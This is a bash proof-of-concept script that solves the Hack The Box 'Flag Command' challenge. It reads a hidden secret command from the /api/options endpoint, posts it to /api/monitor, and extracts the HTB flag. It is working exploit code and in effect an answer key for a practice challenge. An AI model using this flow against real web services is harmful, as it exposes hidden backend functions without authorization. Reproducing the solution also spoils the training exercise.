#!/usr/bin/env bash
set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - Flag Command
# Type: Client-side hidden command exposure -> Direct backend abuse
# Target endpoints: GET /api/options, POST /api/monitor
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly OPTIONS_PATH="/api/options"
readonly MONITOR_PATH="/api/monitor"
readonly MAIN_JS_PATH="/static/terminal/js/main.js"
readonly DEFAULT_TIMEOUT=10

HOST=""
PORT=""
TIMEOUT="${DEFAULT_TIMEOUT}"
VERBOSE=0
JSON_OUTPUT=0
SKIP_CHECK=0
FORCED_COMMAND=""
BASE_URL=""

usage() {
  cat <<EOF
Usage:
  ${SCRIPT_NAME} <host> <port>
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --host <host>         Target host or IP address
  --port <port>         Target TCP port
  --command <value>     Force command instead of auto-reading secret command
  --timeout <seconds>   Curl timeout in seconds (default: ${DEFAULT_TIMEOUT})
  --skip-check          Skip frontend behavior check
  --json                Print result as JSON
  --verbose             Enable verbose status output
  -h, --help            Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity failure
  4  /api/options request or parse failure
  5  Secret command not found
  6  Exploit executed but no flag was found
EOF
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_warn() {
  printf '[!] %s\n' "$*" >&2
}

log_ok() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[+] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

require_binary() {
  local bin="$1"
  if ! command -v "${bin}" >/dev/null 2>&1; then
    log_error "Missing required binary: ${bin}"
    exit 1
  fi
}

validate_port() {
  if ! [[ "${PORT}" =~ ^[0-9]+$ ]]; then
    log_error "Port must be numeric: ${PORT}"
    exit 2
  fi
  if (( PORT < 1 || PORT > 65535 )); then
    log_error "Port out of range (1-65535): ${PORT}"
    exit 2
  fi
}

parse_args() {
  local positional=()
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --command)
        FORCED_COMMAND="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --skip-check)
        SKIP_CHECK=1
        shift
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
    HOST="${positional[0]}"
  fi
  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
    PORT="${positional[1]}"
  fi

  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
    log_error "Host and port are required."
    usage >&2
    exit 2
  fi
}

http_get() {
  local path="$1"
  curl --silent --show-error --fail \
    --connect-timeout "${TIMEOUT}" \
    --max-time "${TIMEOUT}" \
    "${BASE_URL}${path}"
}

http_post_json() {
  local path="$1"
  local json_payload="$2"
  curl --silent --show-error --fail \
    --connect-timeout "${TIMEOUT}" \
    --max-time "${TIMEOUT}" \
    -X POST "${BASE_URL}${path}" \
    -H 'Content-Type: application/json' \
    --data "${json_payload}"
}

check_target_reachable() {
  log_info "Checking target reachability: ${BASE_URL}${OPTIONS_PATH}"
  if ! http_get "${OPTIONS_PATH}" >/dev/null; then
    log_error "Target is not reachable."
    exit 3
  fi
}

run_frontend_check() {
  local js_data
  log_info "Running frontend check on ${MAIN_JS_PATH}"
  if ! js_data="$(http_get "${MAIN_JS_PATH}")"; then
    log_warn "Could not fetch frontend JS. Continuing with API-only flow."
    return 0
  fi

  if [[ "${js_data}" != *"/api/options"* ]]; then
    log_warn "Frontend JS did not clearly reference /api/options."
  fi
  if [[ "${js_data}" != *"availableOptions['secret']"* ]]; then
    log_warn "Frontend JS did not clearly reference secret command validation."
  fi
}

extract_secret_command() {
  python3 -c 'import json,sys
try:
    data = json.load(sys.stdin)
except Exception:
    sys.exit(1)
cmds = data.get("allPossibleCommands", {}).get("secret", [])
print(cmds[0] if cmds else "")
' 2>/dev/null
}

build_command_payload() {
  local command="$1"
  python3 -c 'import json,sys; print(json.dumps({"command": sys.argv[1]}))' "${command}"
}

extract_flag() {
  local response="$1"
  printf '%s' "${response}" | grep -oE 'HTB\{[^}]+\}' | head -n 1 || true
}

emit_result() {
  local command="$1"
  local flag="$2"
  if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
    python3 -c 'import json,sys
print(json.dumps({"target": sys.argv[1], "command": sys.argv[2], "flag": sys.argv[3]}))' \
      "${BASE_URL}" "${command}" "${flag}"
  else
    printf '%s\n' "${flag}"
  fi
}

main() {
  local options_response
  local command
  local payload
  local monitor_response
  local flag

  parse_args "$@"
  validate_port
  require_binary "curl"
  require_binary "grep"
  require_binary "python3"

  BASE_URL="http://${HOST}:${PORT}"
  log_info "Target: ${BASE_URL}"
  check_target_reachable

  if [[ "${SKIP_CHECK}" -eq 0 ]]; then
    run_frontend_check
  else
    log_info "Skipping frontend check as requested."
  fi

  if [[ -n "${FORCED_COMMAND}" ]]; then
    command="${FORCED_COMMAND}"
    log_info "Using forced command value."
  else
    log_info "Fetching secret command from ${OPTIONS_PATH}"
    if ! options_response="$(http_get "${OPTIONS_PATH}")"; then
      log_error "Failed to fetch ${OPTIONS_PATH}."
      exit 4
    fi
    log_debug "Options response: ${options_response}"

    if ! command="$(printf '%s' "${options_response}" | extract_secret_command)"; then
      log_error "Failed to parse JSON from ${OPTIONS_PATH}."
      exit 4
    fi
    if [[ -z "${command}" ]]; then
      log_error "No secret command found in API response."
      exit 5
    fi
  fi

  log_info "Sending command to ${MONITOR_PATH}"
  payload="$(build_command_payload "${command}")"
  if ! monitor_response="$(http_post_json "${MONITOR_PATH}" "${payload}")"; then
    log_error "Monitor request failed."
    exit 1
  fi
  log_debug "Monitor response: ${monitor_response}"

  flag="$(extract_flag "${monitor_response}")"
  if [[ -z "${flag}" ]]; then
    log_error "No HTB flag found in response."
    exit 6
  fi

  log_ok "Flag extracted successfully."
  emit_result "${command}" "${flag}"
}

main "$@"
